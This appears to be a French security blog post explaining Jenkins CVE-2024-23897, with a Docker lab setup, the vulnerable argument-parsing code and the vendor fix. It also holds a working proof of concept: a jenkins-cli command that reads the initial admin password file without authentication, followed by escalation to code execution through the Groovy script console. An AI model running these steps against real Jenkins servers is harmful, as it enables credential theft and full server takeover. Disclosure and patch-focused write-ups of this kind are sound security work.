# Compromettre Jenkins via une simple lecture de fichiers : CVE-2024-23897


# üí£ D'une petite erreur verbeuse √† une compromission compl√®te

## A l'origine

Le **25 janvier 2024**, des chercheurs de chez Sonar publient 2 vuln√©rabilit√©s concernant le leader des logiciels d'int√©gration et de d√©ploiement continus open-source (CI/CD) : **Jenkins**.

Jenkins joue un r√¥le central dans **l'automatisation des processus** de d√©veloppement logiciel pour une grande partie de l'industrie, avec une part de march√© d'environ **44% en 2023**. L'impact potentiel de ces vuln√©rabilit√©s est donc **consid√©rable**.

La faille la plus pr√©occupante, identifi√©e sous le nom de **CVE-2024-23897**, permet √† des attaquants non authentifi√©s de lire des donn√©es limit√©es de fichiers arbitraires et √† des attaquants autoris√©s "en lecture seule" d'acc√©der √† l'int√©gralit√© d'un fichier sur le serveur Jenkins.

Deux vuln√©rabilit√©s sont expliqu√©es :

- La vuln√©rabilit√© **CVE-2024-23897** :
    - Un score CVSS de **9.8/10** (assez pr√©occupant) üòÆ
    - Un attaquant anonyme est en mesure de lire une partie limit√©e de fichiers locaux.
- La vuln√©rabilit√© **CVE-2024-23898** :
    - Un score CVSS de 8.8/10
    - Permet √† un attaquant d'ex√©cuter des commandes CLI arbitraires en incitant une victime √† cliquer sur un lien malveillant (CSRF).

## En bref

La vuln√©rabilit√© la plus probl√©matique est la premi√®re : **CVE-2024-23897**

- Les attaquants non authentifi√©s peuvent lire **les premi√®res lignes de fichiers locaux** pr√©sents sur le serveur.
- Les attaquants authentifi√©s en lecture seule peuvent acc√©der √† l'int√©gralit√© des fichiers.
- Il est possible de transformer cette vuln√©rabilit√© en RCE de plusieurs mani√®res :
    - En lisant contenant le mot de passe par d√©faut
    - En elevant ses privil√®ges en tant qu'admin
    - En lisant une clef SSH
    - En r√©cup√©rant des secrets sur la machine
    - Etc...

Jenkins donne d'autres moyens pour obtenir une execution de commande directement sur son blog : https://www.jenkins.io/security/advisory/2024-01-24/

## Exploitation

Pour exploiter la premi√®re vuln√©rabilit√©, le PoC est assez facile. 

### Docker vuln√©rable

Il est possible de tester avec des versions vuln√©rables via `Docker`.

```bash
docker pull jenkins/jenkins:2.440-jdk17
docker run  -p 8080:8080 jenkins/jenkins:2.440-jdk17
```

### Environnement

Il faut commencer par r√©cup√©rer l'utilitaire de Jenkins `jenkins-cli.jar` en ligne de commande.

```sh
wget http://localhost:8080/jnlpJars/jenkins-cli.jar
```

![Installation des outils](/images/compromettre-jenkins-lecture-fichiers-CVE-2024-23897/jenkins-2.png)

### Code vuln√©rable

Le code ci-dessous d√©taille le code vuln√©rable.

La fonction v√©rifie si l'argument commence par le caract√®re `@`, et si c'est le cas, lit le fichier dans le chemin apr√®s le `@` et cr√©√©e un nouvel argument pour chaque ligne.


```java
private String[] expandAtFiles(String args[]) throws CmdLineException {
    List<String> result = new ArrayList<String>();
    for (String arg : args) {
        if (arg.startsWith("@")) {
            File file = new File(arg.substring(1));
            if (!file.exists())
                throw new CmdLineException(this,Messages.NO_SUCH_FILE,file.getPath());
            try {
                result.addAll(readAllLines(file));
            } catch (IOException ex) {
                throw new CmdLineException(this, "Failed to parse "+file,ex);
            }
        } else {
            result.add(arg);
        }
    }
    return result.toArray(new String[result.size()]);
}
```

Cela signifie que si un attaquant peut contr√¥ler un argument, il peut l'√©tendre √† un certain nombre d'arguments √† partir d'un fichier arbitraire sur l'instance Jenkins.

De ce fait, l'exploitation de la fonction `expandAtFiles()` de `arg4j` affichant une erreur verbeuse lors de la tentative de lecture du fichier est possible.

### Lecture arbitraire...

La commande ci-dessous permet √† un utilisateur **non authentifi√©** de r√©cup√©rer la premi√®re ligne du fichier `/var/jenkins_home/secrets/initialAdminPassword`

```sh
java -jar jenkins-cli.jar -noCertificateCheck -s http://127.0.0.1:8080 who-am-i "@/var/jenkins_home/secrets/initialAdminPassword"
```

![Lecture de fichiers arbitraires](/images/compromettre-jenkins-lecture-fichiers-CVE-2024-23897/jenkins-3.png)

### ...vers RCE

Il est donc possible de r√©cup√©rer le mot de passe par d√©faut de l'administrateur si ce dernier n'a pas √©t√© chang√©.

![Capture du mot de passe administrateur](/images/compromettre-jenkins-lecture-fichiers-CVE-2024-23897/jenkins-4.png)


Il est ensuite possible de se connecter sur `/script` pour ex√©cuter nos commandes. 

![Execution de commande](/images/compromettre-jenkins-lecture-fichiers-CVE-2024-23897/jenkins-1.png)

Le code ci-dessous permet d'ex√©cuter la commande `/bin/id`.

```groovy
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

Pour terminer, une d√©monstration est disponible juste en dessous !

## Actions recommand√©es

L'√©quipe de s√©curit√© de Jenkins a corrig√© la CVE-2024-23897 en ajoutant une configuration s√©curis√©e d√©sactivant la fonctionnalit√© `expandAtFiles`.

La ligne suivante est retir√©e :

```java
    return new CmdLineParser(this);
```

Et remplac√© par les lignes suivantes :

```java
public static boolean ALLOW_AT_SYNTAX = SystemProperties.getBoolean(CLICommand.class.getName() + ".allowAtSyntax");
    // [...]
    ParserProperties properties = ParserProperties.defaults().withAtSyntax(ALLOW_AT_SYNTAX);
    return new CmdLineParser(this, properties);
```

La deuxi√®me vuln√©rabilit√© `CVE-2024-23898`, cons√©quente direct de la premi√®re, a √©t√© corrig√© en ajoutant une v√©rification de l'origine sur le m√©canisme de WebSocket.

Patchez rapidement

## D√©monstration

D√©monstration avec les √©l√©ments d√©taill√©s ci-dessus.

<video src="/images/compromettre-jenkins-lecture-fichiers-CVE-2024-23897/exploit.mp4" controls autoplay loop title="Exploitation de Jenkins" style="width:100%"></video>

## Sources

- https://www.jenkins.io/security/advisory/2024-01-24/#binary-files-note
- https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/
